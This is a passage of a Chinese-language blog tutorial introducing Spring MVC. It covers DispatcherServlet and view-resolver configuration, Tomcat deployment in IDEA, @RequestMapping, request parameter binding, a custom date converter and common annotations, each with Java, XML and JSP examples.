&lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;        &lt;!-- 配置Servlet的初始化参数，读取springmvc的配置文件，创建spring容器 --&gt;        &lt;init-param&gt;            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;            &lt;param-value&gt;classpath:springmvc.xml&lt;/param-value&gt;        &lt;/init-param&gt;       &lt;!-- 配置servlet的对象的创建时间点，取值只能是非 0 正整数，表示启动顺序。        “1” 表示应用加载时创建。--&gt;        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;dispatcherServlet&lt;/servlet-name&gt;        &lt;url-pattern&gt;/&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;</code></pre><p><strong>3、 编写springmvc.xml的配置文件</strong>：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot;       xmlns:context=&quot;http://www.springframework.org/schema/context&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;        http://www.springframework.org/schema/beans        http://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/mvc        http://www.springframework.org/schema/mvc/spring-mvc.xsd        http://www.springframework.org/schema/context        http://www.springframework.org/schema/context/spring-context.xsd&quot;&gt;    &lt;!-- 配置spring创建容器时要扫描的包 --&gt;    &lt;context:component-scan base-package=&quot;com.smk&quot;&gt;&lt;/context:component-scan&gt;    &lt;!-- 配置视图解析器 --&gt;    &lt;bean id=&quot;viewResolver&quot; class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;        &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/pages/&quot;&gt;&lt;/property&gt;        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;&gt;&lt;/property&gt;    &lt;/bean&gt;    &lt;!-- 配置spring开启注解mvc的支持--&gt;    &lt;mvc:annotation-driven/&gt;&lt;/beans&gt;</code></pre><p><strong>4、 编写index.jsp和HelloController控制器类</strong>：</p><p> index.jsp：</p><pre><code class="html">&lt;body&gt;&lt;h3&gt;入门案例&lt;/h3&gt;&lt;a href=&quot;hello&quot;&gt;入门案例&lt;/a&gt;&lt;/body&gt;</code></pre><p>HelloController:</p><pre><code class="java">@Controllerpublic class HelloController &#123;    @RequestMapping(&quot;/hello&quot;)    public String sayHello() &#123;        System.out.println(&quot;Hello SpringMVC&quot;);        return &quot;success&quot;;    &#125;&#125;</code></pre><p><strong>5、 在WEB-INF目录下创建pages文件夹，编写success.jsp的成功页面</strong>；</p><pre><code class="html">&lt;body&gt;&lt;h3&gt;入门成功！！&lt;/h3&gt;&lt;/body&gt;</code></pre><p><strong>6、 启动Tomcat服务器，进行测试</strong>：</p><p>因为之前一直用的Eclipse，所以这里细说一下IDEA下添加tomcat并发布项目的过程。</p><p>1、首先点击箭头所指处添加服务器：</p><p><img src="https://img-blog.csdnimg.cn/20201020194826260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p>2、点左上角的加号，找到并选择Tomcat Server下的 Local</p><p><img src="https://img-blog.csdnimg.cn/20201020194958529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>3、在Deployment下点 “+” 号，选择第一个添加项目：</p><p><img src="https://img-blog.csdnimg.cn/20201020195519996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br> 选择第一个</p><p><img src="https://img-blog.csdnimg.cn/20201020195715374.png#pic_center"><br>箭头处为项目的访问路径，完整路径要加上 localhost:8080 </p><p><img src="https://img-blog.csdnimg.cn/20201020200622280.png#pic_center"></p><blockquote><p>注：一定要点 Apply，不然无法完成添加。</p></blockquote><p>4、添加完成后会出现Application Server 。</p><p><img src="https://img-blog.csdnimg.cn/20201020200935698.png#pic_center"><br>5、右键运行，IDEA会自动跳转到游览器打开：</p><p><img src="https://img-blog.csdnimg.cn/20201020201211792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201020201229597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br>测试成功！（￣︶￣）↗　<br><br></p><h4 id="三、入门案例的执行过程分析："><a href="#三、入门案例的执行过程分析：" class="headerlink" title="三、入门案例的执行过程分析："></a>三、入门案例的执行过程分析：</h4><p> <strong>1、入门案例的执行流程</strong>：</p><ol><li>当启动Tomcat服务器的时候，因为配置了load-on-startup标签，所以会创建DispatcherServlet对象，就会加载springmvc.xml配置文件。</li><li>开启了注解扫描，那么HelloController对象就会被创建。</li><li>从index.jsp发送请求，请求会先到达DispatcherServlet核心控制器，根据配置@RequestMapping注解找到执行的具体方法。</li><li>根据执行方法的返回值，再根据配置的视图解析器，去指定的目录下查找指定名称的JSP文件。</li><li>Tomcat服务器渲染页面，做出响应。</li></ol><p>图解：</p><p><img src="https://img-blog.csdnimg.cn/20201020205708148.png#pic_center"><br> <strong>2、入门案例中的组件分析</strong>：</p><p>1、前端控制器（DispatcherServlet）</p><ul><li> 用户请求到达前端控制器，它就相当于 mvc 模式中的 c，dispatcherServlet 是整个流程控制的中心，由它调用其它组件处理用户的请求，dispatcherServlet 的存在降低了组件之间的耦合性。</li></ul><p>2、处理器映射器（HandlerMapping）</p><ul><li>HandlerMapping 负责根据用户请求找到 Handler 即处理器，SpringMVC 提供了不同的映射器实现不同的映射方式，例如：配置文件方式，实现接口方式，注解方式等。</li></ul><p>3、处理器适配器（HandlAdapter）</p><ul><li>通过 HandlerAdapter 对处理器进行执行，这是适配器模式的应用，通过扩展适配器可以对更多类型的处理器进行执行。</li></ul><p>4、处理器（Handler）</p><ul><li>它就是我们开发中要编写的具体业务控制器。由 DispatcherServlet 把用户请求转发到 Handler。由Handler 对具体的用户请求进行处理。</li></ul><p>5、视图解析器（View Resolver）</p><ul><li>View Resolver 负责将处理结果生成 View 视图，View Resolver 首先根据逻辑视图名解析成物理视图名即具体的页面地址，再生成 View 视图对象，最后对 View 进行渲染将处理结果通过页面展示给用户。</li></ul><p>6、视图（View）</p><ul><li><p>SpringMVC 框架提供了很多的 View 视图类型的支持，包括：jstlView、freemarkerView、pdfView等。我们最常用的视图就是 jsp。</p></li><li><p>一般情况下需要通过页面标签或页面模版技术将模型数据通过页面展示给用户，需要由程序员根据业务需求开发具体的页面。</p></li></ul><p> <strong>3、<code>&lt;mvc:annotation-driven/&gt;</code>说明</strong>：</p><ul><li>在 SpringMVC 的各个组件中，处理器映射器、处理器适配器、视图解析器称为 SpringMVC 的三大组件。</li><li>使 用 <code>&lt;mvc:annotation-driven&gt;</code> 自动加载 RequestMappingHandlerMapping（处理映射器）和RequestMappingHandlerAdapter（处理适配器），可用在SpringMVC.xml 配置文件中使用<code>&lt;mvc:annotation-driven/&gt;</code>替代注解处理器和适配器的配置。</li><li>一般开发中，我们都需要写上此标签（虽然从入门案例中看，我们不写也行，随着课程的深入，该标签还有具体的使用场景）。</li></ul><h4 id="四、RequestMapping-注解："><a href="#四、RequestMapping-注解：" class="headerlink" title="四、RequestMapping 注解："></a>四、RequestMapping 注解：</h4><h5 id="1、使用说明："><a href="#1、使用说明：" class="headerlink" title="1、使用说明："></a>1、使用说明：</h5><p><strong>作用</strong>：</p><ul><li>用于建立请求 URL 和处理请求方法之间的对应关系。</li></ul><p><strong>出现位置</strong>：</p><p>类上：</p><ul><li>请求 URL 的第一级访问目录。此处不写的话，就相当于应用的根目录。写的话需要以<code>/</code>开头。</li></ul><p>它出现的目的是为了使我们的 URL 可以按照模块化管理：</p><p>例如：</p><ul><li><p>账户模块：<br>/account/add<br>/account/update<br>/account/delete</p></li><li><p>订单模块：<br>/order/add<br>/order/update<br>/order/delete</p></li></ul><p>/accound，/order 就是把 RequsetMappding 写在类上，使我们的 URL 更加精细。</p><p>方法上：</p><ul><li>请求 URL 的第二级访问目录。</li></ul><p><strong>属性</strong>：</p><p>value：用于指定请求的 URL。它和 path 属性的作用是一样的。</p><p>method：用于指定请求的方式。</p><p>params：用于指定限制请求参数的条件。它支持简单的表达式。要求请求参数的 key 和 value 必须和配置的一模一样。</p><ul><li>例如：<br>params = {“accountName”}，表示请求参数必须有 accountName<br>params = {“moeny!100”}，表示请求参数中 money 不能是 100。</li></ul><p>headers：用于指定限制请求消息头的条件。</p><blockquote><p>注意：以上四个属性只要出现 2 个或以上时，他们的关系是与的关系。</p></blockquote><h5 id="2、使用示例："><a href="#2、使用示例：" class="headerlink" title="2、使用示例："></a>2、使用示例：</h5><p><strong>1、出现位置的示例</strong>：</p><p>控制器代码：</p><pre><code class="java">@Controller(&quot;accountController&quot;)@RequestMapping(&quot;/account&quot;)public class AccountController &#123;    @RequestMapping(&quot;/findAccount&quot;)    public String findAccount() &#123;        System.out.println(&quot;查询了账户。。。。&quot;);        return &quot;success&quot;;    &#125;&#125;</code></pre><p>jsp代码：</p><pre><code class="html">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt;    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;    &lt;title&gt;requestmapping 的使用&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- 第一种访问方式 --&gt;&lt;a href=&quot;$&#123;pageContext.request.contextPath&#125;/account/findAccount&quot;&gt;    查询账户&lt;/a&gt;&lt;br/&gt;&lt;!-- 第二种访问方式 --&gt;&lt;a href=&quot;account/findAccount&quot;&gt;查询账户&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><blockquote><p>注意：当使用此种方式配置时，在 jsp 中第二种写法时，不要在访问 URL 前面加<code>/</code>，否则无法找到资源。</p></blockquote><p><strong>2、method 属性的示例</strong>：</p><p>控制器代码：</p><pre><code class="java">@RequestMapping(value=&quot;/saveAccount&quot;,method=RequestMethod.POST)public String saveAccount() &#123;    System.out.println(&quot;保存了账户&quot;);    return &quot;success&quot;;&#125;</code></pre><p>jsp 代码：</p><pre><code class="html">&lt;!-- 请求方式的示例 --&gt;&lt;a href=&quot;account/saveAccount&quot;&gt;保存账户，get 请求&lt;/a&gt;&lt;br/&gt;&lt;form action=&quot;account/saveAccount&quot; method=&quot;post&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;保存账户，post 请求&quot;&gt;&lt;/form&gt;</code></pre><p>当使用 get 请求时，提示错误信息是 405，信息是方法不支持 get 方式请求</p><p><img src="https://img-blog.csdnimg.cn/20201020230819527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><strong>3、params 属性的示例</strong>：</p><p>控制器的代码：</p><pre><code class="java">@RequestMapping(value=&quot;/removeAccount&quot;,params= &#123;&quot;accountName&quot;,&quot;money&gt;100&quot;&#125;)    public String removeAccount() &#123;    System.out.println(&quot;删除了账户&quot;);    return &quot;success&quot;;    &#125;</code></pre><p>jsp 中的代码：</p><pre><code class="java">&lt;!-- 请求参数的示例 --&gt;&lt;a href=&quot;account/removeAccount?accountName=aaa&amp;money&gt;100&quot;&gt;删除账户，金额 100&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;account/removeAccount?accountName=aaa&amp;money&gt;150&quot;&gt;删除账户，金额 150&lt;/a&gt;</code></pre><p>当点击第一个超链接时,可以访问成功。<br>当点击第二个超链接时，无法访问。如下图：</p><p><img src="https://img-blog.csdnimg.cn/20201020232649491.png#pic_center"><br><br><br></p><h4 id="五、请求参数的绑定："><a href="#五、请求参数的绑定：" class="headerlink" title="五、请求参数的绑定："></a>五、请求参数的绑定：</h4><h5 id="1、什么是参数绑定？"><a href="#1、什么是参数绑定？" class="headerlink" title="1、什么是参数绑定？"></a>1、什么是参数绑定？</h5><ul><li>就是将请求参数串中的value值获取到之后，在进行类型转换，然后将转换后的值赋值给Controller类中方法的形参，这个过程就是参数绑定。　　<h5 id="2、-绑定说明："><a href="#2、-绑定说明：" class="headerlink" title="2、 绑定说明："></a>2、 绑定说明：</h5></li></ul><p><strong>2.1、绑定的机制</strong>：</p><p> 我们都知道，表单中请求参数都是基于 key=value 的。<br> SpringMVC 绑定请求参数的过程是通过把表单提交请求参数，作为控制器中方法参数进行绑定的。</p><p>例：</p><p>jsp 代码：</p><pre><code class="html">&lt;a href=&quot;account/findAccount?accountId=10&quot;&gt;查询账户&lt;/a&gt;</code></pre><p>jsp中请求参数是：accountId=10</p><pre><code class="java">@RequestMapping(&quot;/findAccount&quot;)public String findAccount(Integer accountId) &#123;    System.out.println(&quot;查询了账户。。。。&quot;+accountId);    return &quot;success&quot;;&#125;</code></pre><p>点击链接，会在控制台输出：<br><img src="https://img-blog.csdnimg.cn/20201021205427741.png"><br><strong>2.2、支持的数据类型：</strong></p><ol><li>基本数据类型和 String 类型</li><li>POJO 类型参数：包括实体类，以及关联的实体类</li><li>集合类型和数组：包括 List 结构和 Map 结构的集合（包括数组）</li></ol><h5 id="3、使用示例："><a href="#3、使用示例：" class="headerlink" title="3、使用示例："></a>3、使用示例：</h5><p><strong>3.1、基本类型和 String 类型作为参数</strong>：</p><p>jsp 代码：</p><pre><code class="html">&lt;!-- 基本类型示例 --&gt;&lt;a href=&quot;account/findAccount?accountId=10&amp;accountName=zhangsan&quot;&gt;查询账户&lt;/a&gt;</code></pre><p>控制器代码：</p><pre><code class="java">@RequestMapping(&quot;/findAccount&quot;)public String findAccount(Integer accountId,String accountName) &#123;    System.out.println(&quot;查询了账户。。。。&quot;+accountId+&quot;,&quot;+accountName);    return &quot;success&quot;;&#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201021211630152.png#pic_center"><br><strong>3.2、POJO 类型作为参数</strong>：</p><p>实体类代码：</p><pre><code class="java">/*** 账户信息*/public class Account implements Serializable&#123;    private Integer id;    private String name;    private Float money;    private Address address;    //省略getters and setters 和 tostring方法&#125;</code></pre><pre><code class="java">/*** 地址的实体类*/public class Address implements Serializable &#123;    private String provinceName;    private String cityName;    //省略getters and setters 和 tostring方法    &#125;</code></pre><p>jsp 代码：</p><pre><code class="html">&lt;form action=&quot;account/saveAccount&quot; method=&quot;post&quot;&gt;账户名称：&lt;input type=&quot;text&quot; name=&quot;name&quot; &gt;&lt;br/&gt;账户金额：&lt;input type=&quot;text&quot; name=&quot;money&quot; &gt;&lt;br/&gt;账户省份：&lt;input type=&quot;text&quot; name=&quot;address.provinceName&quot; &gt;&lt;br/&gt;账户城市：&lt;input type=&quot;text&quot; name=&quot;address.cityName&quot; &gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;保存&quot;&gt;&lt;/form&gt;</code></pre><p>控制器代码：</p><pre><code class="java">@RequestMapping(&quot;/saveAccount&quot;)public String saveAccount(Account account) &#123;    System.out.println(&quot;保存了账户。。。。&quot;+account);    return &quot;success&quot;;&#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/2020102122403412.png#pic_center"><br><strong>3.3、 POJO 类中包含集合类型参数</strong>：</p><p>实体类代码：</p><pre><code class="java">public class User implements Serializable &#123;    private String username;    private String password;    private Integer age;    private List&lt;Account&gt; accounts;    private Map&lt;String, Account&gt; accountMap;    //省略getters and setters 和 tostring方法    </code></pre><p>jsp代码：</p><pre><code class="html">&lt;form action=&quot;account/updateAccount&quot; method=&quot;post&quot;&gt;    用户名称：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br/&gt;    用户密码：&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br/&gt;    用户年龄：&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;&lt;br/&gt;    账户 1 名称：&lt;input type=&quot;text&quot; name=&quot;accounts[0].name&quot;&gt;&lt;br/&gt;    账户 1 金额：&lt;input type=&quot;text&quot; name=&quot;accounts[0].money&quot;&gt;&lt;br/&gt;    账户 2 名称：&lt;input type=&quot;text&quot; name=&quot;accounts[1].name&quot;&gt;&lt;br/&gt;    账户 2 金额：&lt;input type=&quot;text&quot; name=&quot;accounts[1].money&quot;&gt;&lt;br/&gt;    账户 3 名称：&lt;input type=&quot;text&quot; name=&quot;accountMap[&#39;one&#39;].name&quot;&gt;&lt;br/&gt;    账户 3 金额：&lt;input type=&quot;text&quot; name=&quot;accountMap[&#39;one&#39;].money&quot;&gt;&lt;br/&gt;    账户 4 名称：&lt;input type=&quot;text&quot; name=&quot;accountMap[&#39;two&#39;].name&quot;&gt;&lt;br/&gt;    账户 4 金额：&lt;input type=&quot;text&quot; name=&quot;accountMap[&#39;two&#39;].money&quot;&gt;&lt;br/&gt;    &lt;input type=&quot;submit&quot; value=&quot;保存&quot;&gt;&lt;/form&gt;</code></pre><p>控制器代码：</p><pre><code class="java">@RequestMapping(&quot;/updateAccount&quot;)public String updateAccount(User user) &#123;    System.out.println(&quot;更新了账户。。。。&quot;+user);    return &quot;success&quot;;&#125;</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20201021230255947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"><br><img src="https://img-blog.csdnimg.cn/20201021232104373.png#pic_center"><br><strong>3.4、请求参数乱码问题</strong>：</p><p>在web请求中当出现中文时会有乱码。get请求是不会乱码的</p><p>当是post 请求方式时，可以在 web.xml 中配置一个过滤器。</p><p>例：</p><pre><code class="xml">    &lt;!-- 配置过滤器，解决中文乱码的问题 --&gt;    &lt;filter&gt;        &lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt;        &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt;        &lt;!-- 指定字符集 --&gt;        &lt;init-param&gt;            &lt;param-name&gt;encoding&lt;/param-name&gt;            &lt;param-value&gt;UTF-8&lt;/param-value&gt;        &lt;/init-param&gt;    &lt;/filter&gt;    &lt;!-- 过滤所有请求 --&gt;     &lt;filter-mapping&gt;        &lt;filter-name&gt;characterEncodingFilter&lt;/filter-name&gt;        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;    &lt;/filter-mapping&gt;</code></pre><h5 id="4、自定义类型转换器："><a href="#4、自定义类型转换器：" class="headerlink" title="4、自定义类型转换器："></a>4、自定义类型转换器：</h5><p> jsp表单提交的任何数据类型全部都是字符串类型，但是后台定义Integer类型，数据也可以封装上，说明Spring框架内部会默认进行数据类型转换。</p><p>但当我们把控制器中方法参数的类型改为 Date 时：</p><ul><li>jsp 代码：<pre><code class="html">&lt;a href=&quot;account/deleteAccount?date=2018-01-01&quot;&gt;根据日期删除账户&lt;/a&gt;</code></pre></li><li>控制器代码：<pre><code class="java">@RequestMapping(&quot;/deleteAccount&quot;)public String deleteAccount(Date date) &#123;  System.out.println(&quot;删除了账户。。。。&quot;+date);  return &quot;success&quot;;&#125;</code></pre>运行结果：</li></ul><p><img src="https://img-blog.csdnimg.cn/20201022122822362.png#pic_center"></p><p>会出现类型转化异常。</p><p><strong>解决办法</strong>：自定义类型转换器</p><p> <strong>使用步骤</strong>：</p><p> 1、定义一个类，实现 Converter 接口，该接口有两个泛型。</p><pre><code class="java">public class StringToDateConverter implements Converter&lt;String, Date&gt; &#123;    @Override    public Date convert(String source) &#123;        DateFormat format = null;        try &#123;            if (source == null) &#123;                throw new NullPointerException(&quot;请输入要转换的日期&quot;);            &#125;            format = new SimpleDateFormat(&quot;yyyy-MM-dd&quot;);            Date date = format.parse(source);            return date;        &#125; catch (Exception e) &#123;            throw new RuntimeException(&quot;输入日期有误&quot;);        &#125;    &#125;&#125;</code></pre><p> 2、第二步：在 spring 配置文件中配置类型转换器。</p><pre><code class="xml">  &lt;!-- 配置类型转换器工厂 --&gt;    &lt;bean id=&quot;converterService&quot; class=&quot;org.springframework.context.support.ConversionServiceFactoryBean&quot;&gt;        &lt;!-- 给工厂注入一个新的类型转换器 --&gt;        &lt;property name=&quot;converters&quot;&gt;            &lt;array&gt;                &lt;!-- 配置自定义类型转换器 --&gt;                &lt;bean class=&quot;com.smk.util.StringToDateConverter&quot;/&gt;            &lt;/array&gt;        &lt;/property&gt;    &lt;/bean&gt;</code></pre><p> 3、第三步：在 annotation-driven 标签中引用配置的类型转换服务 。</p><pre><code class="xml">&lt;!-- 引用自定义类型转换器 --&gt;&lt;mvc:annotation-driven conversion-service=&quot;converterService&quot;/&gt;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201022155614624.png"></p><h5 id="5、在控制器中使用原生的ServletAPI对象"><a href="#5、在控制器中使用原生的ServletAPI对象" class="headerlink" title="5、在控制器中使用原生的ServletAPI对象"></a>5、在控制器中使用原生的ServletAPI对象</h5><p>SpringMVC 还支持使用原始 ServletAPI 对象作为控制器方法的参数。支持原始 ServletAPI 对象有：</p><ul><li>HttpServletRequest、HttpServlet、ResponseHttpSession  等…</li></ul><p><strong>使用方法</strong>：</p><p> 只需要在控制器的方法参数定义HttpServletRequest和HttpServletResponse对象</p><p>例：</p><pre><code class="java">@RequestMapping(&quot;/testServletAPI&quot;)public String testServletAPI(HttpServletRequest request,HttpServletResponse response,HttpSession session) &#123;    System.out.println(request);    System.out.println(response);    System.out.println(session);    return &quot;success&quot;;&#125;</code></pre><h4 id="六、常用注解："><a href="#六、常用注解：" class="headerlink" title="六、常用注解："></a>六、常用注解：</h4><p><strong>1、RequestParam注解</strong>：</p><p>作用：把请求中指定名称的参数给控制器中的形参赋值。</p><p> 属性：</p><ol><li>value：请求参数中的名称</li><li>required：请求参数中是否必须提供此参数，默认值是true，表示必须提供，如果不提供将报错。</li></ol><p>例：</p><p>jsp 中的代码：</p><pre><code class="html">&lt;!-- requestParams 注解的使用 --&gt;&lt;a href=&quot;springmvc/useRequestParam?name=test&quot;&gt;requestParam 注解&lt;/a&gt;</code></pre><p>控制器中的代码：</p><pre><code class="java">@RequestMapping(&quot;/useRequestParam&quot;)public String useRequestParam(@RequestParam(&quot;name&quot;)String username,@RequestParam(value=&quot;age&quot;,required=false)Integer age)&#123;    System.out.println(username+&quot;,&quot;+age);    return &quot;success&quot;;&#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201022170608201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p><strong>2、RequestBody注解</strong>：</p><p>作用：</p><ul><li>用于获取请求体内容。直接使用得到是 key=value&amp;key=value…结构的数据。</li><li>get 请求方式不适用。（因为get没有请求体）</li></ul><p>属性：</p><ul><li> required：是否必须有请求体，默认值是true。当取值为 true 时，get 请求方式会报错。如果取值为 false，get 请求得到是 null。</li></ul><p>例：</p><p>post 请求 jsp 代码：</p><pre><code class="html">&lt;form action=&quot;useRequestBody&quot; method=&quot;post&quot;&gt;用户名称：&lt;input type=&quot;text&quot; name=&quot;username&quot; &gt;&lt;br/&gt;用户密码：&lt;input type=&quot;password&quot; name=&quot;password&quot; &gt;&lt;br/&gt;用户年龄：&lt;input type=&quot;text&quot; name=&quot;age&quot; &gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;保存&quot;&gt;&lt;/form&gt;</code></pre><p>get 请求 jsp 代码：</p><pre><code class="java">&lt;a href=&quot;springmvc/useRequestBody?body=test&quot;&gt;requestBody 注解 get 请求&lt;/a&gt;</code></pre><p>控制器代码：</p><pre><code class="java">@RequestMapping(&quot;/useRequestBody&quot;)public String useRequestBody(@RequestBody(required=false) String body)&#123;    System.out.println(body);    return &quot;success&quot;;&#125;</code></pre><p>post 请求运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201022172247343.png#pic_center"></p><p>get 请求运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201022172527919.png#pic_center"><br><strong>3、PathVariable注解</strong>：</p><p>作用：</p><ul><li>用于绑定 url 中的占位符赋值给形参。例如：请求 url 中 /delete/{id}，这个 {id} 就是 url 占位符。</li><li>url 支持占位符是 spring3.0 之后加入的。是 springmvc 支持 rest 风格 URL 的一个重要标志。</li></ul><p>属性：</p><ul><li>value：用于指定 url 中占位符名称。</li><li>required：是否必须提供占位符。</li></ul><p>使用示例：</p><p>jsp 代码：</p><pre><code class="html">&lt;a href=&quot;usePathVariable/100&quot;&gt;pathVariable 注解&lt;/a&gt;</code></pre><p>控制器代码：</p><pre><code class="java">@RequestMapping(&quot;/usePathVariable/&#123;id&#125;&quot;)public String usePathVariable(@PathVariable(&quot;id&quot;) Integer id)&#123;    System.out.println(id);    return &quot;success&quot;;&#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201022231013530.png#pic_center"></p><p> <strong>Restful风格的URL</strong>：</p><ul><li> 请求路径一样，可以根据不同的请求方式去执行后台的不同方法。</li></ul><p><img src="https://img-blog.csdnimg.cn/20201022231923563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center"></p><p> restful风格的URL优点：</p><ol><li>结构清晰</li><li>符合标准</li><li>易于理解</li><li>扩展方便</li></ol><p><strong>4、RequestHeader注解</strong>：</p><p>作用：</p><ul><li>用于获取请求消息头。</li></ul><p>属性：</p><ul><li>value：提供消息头名称</li><li>required：是否必须有此消息头</li></ul><blockquote><p>注：在实际开发中一般不怎么用。</p></blockquote><p>jsp 中代码：</p><pre><code class="java">&lt;a href=&quot;useRequestHeader&quot;&gt;获取请求消息头&lt;/a&gt;</code></pre><p>控制器中代码：</p><pre><code class="java">@RequestMapping(&quot;/useRequestHeader&quot;)    public String useRequestHeader(@RequestHeader(value = &quot;Accept-Language&quot;,            required = false) String requestHeader) &#123;        System.out.println(requestHeader);        return &quot;success&quot;;    &#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/2020102312430834.png#pic_center"></p><p><strong>6、ModelAttribute注解</strong>：</p><p>作用：</p><ol><li>出现在方法上：表示当前方法会在控制器方法执行前线执行。</li><li>出现在参数上：获取指定的数据给参数赋值。</li></ol><p>属性：</p><ul><li>value：用于获取数据的 key。key 可以是 POJO 的属性名称，也可以是 map 结构的 key。</li></ul><p>应用场景：</p><ul><li>当提交表单数据不是完整的实体数据时，保证没有提交的字段使用数据库原来的数据。</li></ul><p><strong>示例</strong>：</p><p>jps 代码：</p><pre><code class="html">&lt;a href=&quot;testModelAttribute?username=test&quot;&gt;测试 modelattribute&lt;/a&gt;</code></pre><p>控制器代码：</p><pre><code class="java">//接收请求的方法@RequestMapping(&quot;/testModelAttribute&quot;)public String testModelAttribute(User user) &#123;    System.out.println(&quot;执行了控制器的方法&quot;+user.getUsername());    return &quot;success&quot;;&#125;//被 ModelAttribute 修饰的方法@ModelAttributepublic void showModel(User user) &#123;    System.out.println(&quot;执行了 showModel 方法&quot;+user.getUsername());&#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201024235031971.png#pic_center"><br>ModelAttribute 修饰方法带返回值：</p><p>jsp 的代码：</p><pre><code class="html">&lt;!-- 修改用户信息 --&gt;&lt;form action=&quot;updateUser&quot; method=&quot;post&quot;&gt;用户名称：&lt;input type=&quot;text&quot; name=&quot;username&quot; &gt;&lt;br/&gt;用户年龄：&lt;input type=&quot;text&quot; name=&quot;age&quot; &gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;保存&quot;&gt;&lt;/form&gt;</code></pre><p>控制器中的代码：</p><pre><code class="java">    @RequestMapping(&quot;/testModelAttribute2&quot;)    //获取 ModelAttribute修饰的方法中的 User对象      public String testModelAttribute2(User user) &#123;          System.out.println(user);          return &quot;success&quot;;      &#125;    @ModelAttribute    private User showUser(String username) &#123;        //模拟数据库查询，把查询到的数据传入 user 中        User user = new User();        user.setUsername(username);        user.setAge(19);        user.setBirthday(new Date());        return user;    &#125;</code></pre><p>运行结果：</p><p><img src="https://img-blog.csdnimg.cn/20201025001705418.png#pic_center"><br>先执行ModelAttribute修饰的方法，然后在把jsp中的数据覆盖user 的值，所以这里的 年龄和设置的不一样。</p><p>ModelAttribute 修饰方法不带返回值：</p><p>jsp 的代码：同上</p><p>控制器中的代码：</p><pre><code class="java"> @RequestMapping(&quot;/testModelAttribute2&quot;)     //把 ModelAttribute修饰的方法里的 map里 key的值赋给 user    public String testModelAttribute2(@ModelAttribute(&quot;abc&quot;) User user) &#123;        System.out.println(user);        return &quot;success&quot;;    &#125; @ModelAttribute  